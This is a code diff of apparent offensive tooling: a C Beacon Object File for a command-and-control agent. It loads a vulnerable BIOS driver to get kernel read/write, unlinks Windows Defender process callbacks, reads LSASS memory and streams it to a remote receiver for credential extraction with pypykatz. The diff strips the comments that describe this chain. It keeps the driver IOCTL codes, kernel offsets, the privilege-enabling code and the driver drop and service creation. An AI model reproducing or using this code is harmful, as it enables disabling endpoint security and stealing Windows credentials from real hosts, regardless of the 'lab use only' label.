@@ -1,47 +1,7 @@
-/*
- * byovd_dump_bof.c - BYOVD LSASS credential dump BOF for Kassandra Mythic agent
- *
- * Execution via Kassandra executeBOF command. Runs entirely in-memory inside
- * the agent process. No child process, no disk artifact for the dump.
- *
- * What it does:
- *   1. Writes BiosToolCommonDriver.sys to %TEMP% (needed for NtLoadDriver)
- *   2. Loads driver via NtLoadDriver + registry service key
- *   3. Opens device handle -> kernel R/W via physical memory IOCTLs
- *   4. Patches WdFilter ObCallbacks (Process + Thread) via OBJECT_TYPE.CallbackList unlink
- *   5. Opens LSASS with PROCESS_VM_READ | PROCESS_QUERY_INFORMATION
- *   6. VirtualQueryEx + ReadProcessMemory over all committed readable regions
- *   7. Streams [base:8][size:8][data:N] records directly to TCP receiver (no dump file on disk)
- *   8. Cleanup: unload driver, delete service key, delete temp .sys
- *
- * Offline extraction on analyst box:
- *   nc -lvp 9999 > lsass_raw.bin   (on receiver before running BOF)
- *   python3 tools/rpm2minidump.py lsass_raw.bin lsass.dmp
- *   pypykatz lsa minidump lsass.dmp
- *
- * Kassandra usage (executeBOF):
- *   file_id: byovd_dump_bof.o
- *   parameters: bin:<base64_BiosToolCommonDriver.sys> str:<receiver_ip> int:<receiver_port>
- *
- * Build:
- *   MinGW (macOS/Linux cross-compile):
- *     x86_64-w64-mingw32-gcc -c byovd_dump_bof.c -o byovd_dump_bof.o \
- *       -masm=intel -Wall -Wno-unused-function
- *
- *   MSVC (Windows):
- *     cl /c /GS- /Gs9999999 /W3 byovd_dump_bof.c /Fo:byovd_dump_bof.obj
- *
- * Requires: Administrator + SeLoadDriverPrivilege on target host.
- * Lab-authorized BYOVD research tool. Isolated lab use only.
- */
-
-#include <winsock2.h>   /* must precede windows.h */
+#include <winsock2.h>
 #include <windows.h>
 #include <tlhelp32.h>
 
-/* ============================================================================
- * BOF Beacon API
- * ============================================================================ */
 typedef struct {
     char *original;
     char *buffer;
@@ -58,9 +18,6 @@ int   BeaconDataInt(datap *parser);
 #define CALLBACK_OUTPUT 0x00
 #define CALLBACK_ERROR  0x0d
 
-/* ============================================================================
- * NT / Win32 type declarations
- * ============================================================================ */
 #ifndef NTSTATUS
 typedef LONG NTSTATUS;
 #endif
@@ -72,13 +29,7 @@ typedef struct {
     LPWSTR Buffer;
 } USTR_W;
 
-/* use struct sockaddr_in directly from winsock2.h */
 
-/* ============================================================================
- * External API declarations (BOF LIBRARY$Function convention)
- * ============================================================================ */
-
-/* ntdll */
 DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtLoadDriver(USTR_W *RegistryPath);
 DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtUnloadDriver(USTR_W *RegistryPath);
 DECLSPEC_IMPORT PVOID    NTAPI NTDLL$RtlAllocateHeap(PVOID Heap, ULONG Flags, SIZE_T Size);
@@ -87,7 +38,6 @@ DECLSPEC_IMPORT PVOID    NTAPI NTDLL$RtlProcessHeap(void);
 DECLSPEC_IMPORT void     NTAPI NTDLL$RtlMoveMemory(PVOID dst, const PVOID src, SIZE_T n);
 DECLSPEC_IMPORT void     NTAPI NTDLL$RtlZeroMemory(PVOID dst, SIZE_T n);
 
-/* kernel32 */
 DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
 DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
 DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteFile(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
@@ -112,7 +62,6 @@ DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Process32NextW(HANDLE,LPPROCESSENTRY32W);
 DECLSPEC_IMPORT int    WINAPI KERNEL32$MultiByteToWideChar(UINT,DWORD,LPCSTR,int,LPWSTR,int);
 DECLSPEC_IMPORT int    WINAPI KERNEL32$WideCharToMultiByte(UINT,DWORD,LPCWSTR,int,LPSTR,int,LPCSTR,LPBOOL);
 
-/* advapi32 */
 DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR,LPCSTR,PLUID);
 DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE,BOOL,PTOKEN_PRIVILEGES,DWORD,PTOKEN_PRIVILEGES,PDWORD);
 DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegCreateKeyExW(HKEY,LPCWSTR,DWORD,LPWSTR,DWORD,REGSAM,LPSECURITY_ATTRIBUTES,PHKEY,LPDWORD);
@@ -120,7 +69,6 @@ DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegSetValueExW(HKEY,LPCWSTR,DWORD,DWORD,con
 DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegCloseKey(HKEY);
 DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegDeleteKeyW(HKEY,LPCWSTR);
 
-/* ws2_32 */
 DECLSPEC_IMPORT int          WINAPI WS2_32$WSAStartup(WORD,WSADATA*);
 DECLSPEC_IMPORT int          WINAPI WS2_32$WSACleanup(void);
 DECLSPEC_IMPORT SOCKET       WINAPI WS2_32$socket(int,int,int);
@@ -130,36 +78,22 @@ DECLSPEC_IMPORT int          WINAPI WS2_32$closesocket(SOCKET);
 DECLSPEC_IMPORT unsigned long WINAPI WS2_32$inet_addr(const char*);
 DECLSPEC_IMPORT unsigned short WINAPI WS2_32$htons(unsigned short);
 
-/* ============================================================================
- * Constants
- * ============================================================================ */
 #define BIOSTOOL_READ_PHYS  0x22202Cu
 #define BIOSTOOL_WRITE_PHYS 0x222030u
 #define BIOSTOOL_VA2PA      0x222034u
 
-/* OBJECT_TYPE.CallbackList offset (stable Win10/11) */
 #define OBJ_TYPE_CALLBACK_LIST_OFF 0xC8
-
-/* OB_CALLBACK_ENTRY field offsets */
 #define CBENTRY_PRE_OP_OFF  0x28
 #define CBENTRY_POST_OP_OFF 0x30
-
-/* ntoskrnl PE header offsets for export directory */
-#define NT_EXPORT_DIR_OFF 0x88   /* OptHeader RVA of export directory */
+#define NT_EXPORT_DIR_OFF 0x88
 
 typedef unsigned long long QWORD;
 
-/* ============================================================================
- * Globals (BOF lifetime only - zeroed on entry)
- * ============================================================================ */
 static HANDLE  g_dev    = INVALID_HANDLE_VALUE;
 static wchar_t g_svcName[64];
 static wchar_t g_regPath[256];
 static wchar_t g_drvPath[MAX_PATH];
 
-/* ============================================================================
- * Inline helpers (no external calls)
- * ============================================================================ */
 static void bof_wcs_copy(wchar_t *dst, const wchar_t *src) {
     while ((*dst++ = *src++) != 0);
 }
@@ -194,9 +128,6 @@ static void bof_memset0(void *dst, SIZE_T n) {
     NTDLL$RtlZeroMemory(dst, n);
 }
 
-/* ============================================================================
- * Privilege helper
- * ============================================================================ */
 static void EnablePriv(const char *name) {
     HANDLE hToken = NULL;
     if (!KERNEL32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
@@ -211,15 +142,11 @@ static void EnablePriv(const char *name) {
     KERNEL32$CloseHandle(hToken);
 }
 
-/* ============================================================================
- * Driver: write to disk, create service, NtLoadDriver
- * ============================================================================ */
 static BOOL WriteDriver(const char *bytes, int len) {
     wchar_t tmpDir[MAX_PATH];
     DWORD pid = KERNEL32$GetCurrentProcessId();
     KERNEL32$GetTempPathW(MAX_PATH, tmpDir);
 
-    /* build path: %TEMP%\bcd_<pid>.sys */
     char pidStr[16];
     bof_str_uint(pid, pidStr);
 
@@ -250,7 +177,6 @@ static BOOL WriteDriver(const char *bytes, int len) {
 }
 
 static BOOL CreateSvcKey(void) {
-    /* Service name: BiosTool_<pid> */
     char pidStr[16];
     bof_str_uint(KERNEL32$GetCurrentProcessId(), pidStr);
 
